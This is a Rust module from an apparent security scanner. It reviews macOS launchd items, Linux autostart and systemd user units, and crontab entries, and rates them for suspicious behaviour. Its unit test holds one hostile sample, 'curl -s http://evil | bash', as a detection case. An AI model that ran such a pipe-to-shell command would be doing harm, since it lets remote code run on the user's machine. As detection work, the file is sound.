//! Things that start automatically: LaunchAgents/Daemons (macOS), autostart
//! entries and systemd user units (Linux), and crontab.

use std::path::{Path, PathBuf};
use std::process::Command;

use super::{patterns, read_small, Area, Finding, Severity};
use crate::env::{Env, Os};

const INTERPRETERS: &[&str] = &[
    "node", "bun", "deno", "python", "python3", "ruby", "perl", "osascript", "sh", "bash", "zsh", "curl", "wget",
];

/// Where a legitimately installed program lives.
const TRUSTED_PREFIXES: &[&str] = &[
    "/Applications/", "/System/", "/Library/Application Support/", "/usr/", "/opt/homebrew/",
    "/Library/PrivilegedHelperTools/", "/Library/Apple/", "/sbin/", "/bin/",
];

pub struct StartupItem {
    pub label: String,
    pub source: PathBuf,
    pub args: Vec<String>,
    pub system: bool,
}

fn basename(s: &str) -> &str {
    s.rsplit('/').next().unwrap_or(s)
}

fn looks_hidden(arg: &str, home: &Path) -> bool {
    let h = home.display().to_string();
    let in_temp = ["/tmp/", "/private/tmp/", "/var/tmp/", "/Users/Shared/"].iter().any(|t| arg.starts_with(t));
    let hidden_in_home = arg.starts_with(&h) && arg[h.len()..].split('/').any(|c| c.starts_with('.') && c.len() > 1);
    in_temp || hidden_in_home
}

/// Judge one startup item. Every user-level item is at least listed as Info,
/// so you can see everything that runs when you log in.
pub fn evaluate(item: &StartupItem, env: &Env) -> Option<Finding> {
    let cmd = item.args.join(" ");
    let prog = item.args.first().cloned().unwrap_or_default();
    let hits = patterns::scan_text(&cmd);
    let interp = INTERPRETERS.contains(&basename(&prog));
    let hidden = item.args.iter().any(|a| looks_hidden(a, &env.home));
    let trusted = TRUSTED_PREFIXES.iter().any(|p| prog.starts_with(p)) && !interp;
    let missing = prog.starts_with('/') && !Path::new(&prog).exists();

    let (sev, why) = if patterns::worst(&hits) == Some(Severity::High) {
        (Severity::High, hits[0].reason.to_string())
    } else if interp && hidden {
        (Severity::High, format!("runs {} on a script hidden in {}", basename(&prog), item.args.iter().find(|a| looks_hidden(a, &env.home)).cloned().unwrap_or_default()))
    } else if hidden {
        (Severity::Medium, "runs a program from a hidden or temporary folder".to_string())
    } else if interp {
        (Severity::Medium, format!("starts a {} script at login — unusual for normal apps", basename(&prog)))
    } else if let Some(h) = hits.first() {
        (h.severity, h.reason.to_string())
    } else if missing {
        (Severity::Low, "points to a program that no longer exists (leftover from an uninstalled app)".to_string())
    } else if trusted || item.system {
        return None;
    } else {
        (Severity::Info, "starts automatically".to_string())
    };
    let title = match sev {
        Severity::Info => format!("Startup item: {}", item.label),
        Severity::Low => format!("Leftover startup item: {}", item.label),
        _ => format!("Suspicious startup item: {}", item.label),
    };
    let mut f = Finding::new(sev, Area::Startup, title, format!("This item {why}."))
        .path(&item.source)
        .evidence(patterns::excerpt(&cmd));
    if sev >= Severity::Low {
        f = f.quarantinable();
    }
    if env.os == Os::Mac && sev >= Severity::Medium {
        f = f.advice(format!(
            "If you don't recognise it, quarantine it, then run: launchctl bootout gui/$(id -u)/{}",
            item.label
        ));
    }
    Some(f)
}

fn launchd_items(env: &Env) -> Vec<StartupItem> {
    let mut items = Vec::new();
    let dirs = [
        (env.home.join("Library/LaunchAgents"), false),
        (env.root.join("Library/LaunchAgents"), true),
        (env.root.join("Library/LaunchDaemons"), true),
    ];
    for (dir, system) in dirs {
        let Ok(rd) = std::fs::read_dir(&dir) else { continue };
        for e in rd.flatten() {
            let p = e.path();
            if p.extension().is_none_or(|x| x != "plist") {
                continue;
            }
            let Ok(v) = plist::Value::from_file(&p) else { continue };
            let Some(d) = v.as_dictionary() else { continue };
            let label = d.get("Label").and_then(|x| x.as_string()).unwrap_or("?").to_string();
            let mut args: Vec<String> = d
                .get("ProgramArguments")
                .and_then(|x| x.as_array())
                .map(|a| a.iter().filter_map(|x| x.as_string().map(String::from)).collect())
                .unwrap_or_default();
            if let Some(prog) = d.get("Program").and_then(|x| x.as_string()) {
                if args.first().map(String::as_str) != Some(prog) {
                    args.insert(0, prog.to_string());
                }
            }
            items.push(StartupItem { label, source: p, args, system });
        }
    }
    items
}

fn linux_items(env: &Env) -> Vec<StartupItem> {
    let mut items = Vec::new();
    let sources = [
        (env.home.join(".config/autostart"), "Exec="),
        (env.home.join(".config/systemd/user"), "ExecStart="),
    ];
    for (dir, key) in sources {
        let Ok(rd) = std::fs::read_dir(&dir) else { continue };
        for e in rd.flatten() {
            let p = e.path();
            let Some(text) = read_small(&p, 256 * 1024) else { continue };
            for line in text.lines() {
                if let Some(cmd) = line.trim().strip_prefix(key) {
                    items.push(StartupItem {
                        label: p.file_name().unwrap_or_default().to_string_lossy().to_string(),
                        source: p.clone(),
                        args: cmd.split_whitespace().map(String::from).collect(),
                        system: false,
                    });
                }
            }
        }
    }
    items
}

fn crontab(env: &Env) -> Vec<Finding> {
    let Ok(out) = Command::new("crontab").arg("-l").output() else { return vec![] };
    if !out.status.success() {
        return vec![];
    }
    let text = String::from_utf8_lossy(&out.stdout);
    text.lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .filter(|l| !l.split_once('=').is_some_and(|(k, _)| !k.is_empty() && k.chars().all(|c| c.is_ascii_uppercase() || c == '_')))
        .filter_map(|l| {
            let args: Vec<String> = l.split_whitespace().skip(if l.starts_with('@') { 1 } else { 5 }).map(String::from).collect();
            let item = StartupItem { label: "crontab entry".into(), source: PathBuf::from("crontab"), args, system: false };
            evaluate(&item, env).map(|mut f| {
                f.can_quarantine = false;
                f.advice = Some("Edit scheduled jobs with: crontab -e".into());
                f
            })
        })
        .collect()
}

pub fn scan(env: &Env) -> Vec<Finding> {
    let items = match env.os {
        Os::Mac => launchd_items(env),
        Os::Linux => linux_items(env),
        Os::Windows => vec![],
    };
    let mut out: Vec<Finding> = items.iter().filter_map(|i| evaluate(i, env)).collect();
    // System-wide items can't be moved without admin rights.
    for f in out.iter_mut() {
        if f.path.as_deref().is_some_and(|p| !p.starts_with(&env.home.display().to_string())) {
            f.can_quarantine = false;
        }
    }
    if env.os != Os::Windows && env.root == Path::new("/") {
        out.extend(crontab(env));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn item(args: &[&str]) -> StartupItem {
        StartupItem { label: "x".into(), source: "/p".into(), args: args.iter().map(|s| s.to_string()).collect(), system: false }
    }

    #[test]
    fn judges_startup_items() {
        let env = Env { home: "/Users/me".into(), ..Env::sandboxed(Path::new("/tmp/x"), Os::Mac) };
        let sev = |a: &[&str]| evaluate(&item(a), &env).map(|f| f.severity);
        assert_eq!(sev(&["/usr/local/bin/node", "/Users/me/.config/sys/run.js"]), Some(Severity::High));
        assert_eq!(sev(&["/bin/bash", "-c", "curl -s http://evil | bash"]), Some(Severity::High));
        assert_eq!(sev(&["/Users/me/.local/bin/agent"]), Some(Severity::Medium));
        assert_eq!(sev(&["/usr/local/bin/python3", "/Users/me/tools/sync.py"]), Some(Severity::Medium));
        assert_eq!(sev(&["/Applications/Nope.app/Contents/MacOS/Nope"]), Some(Severity::Low));
    }
}
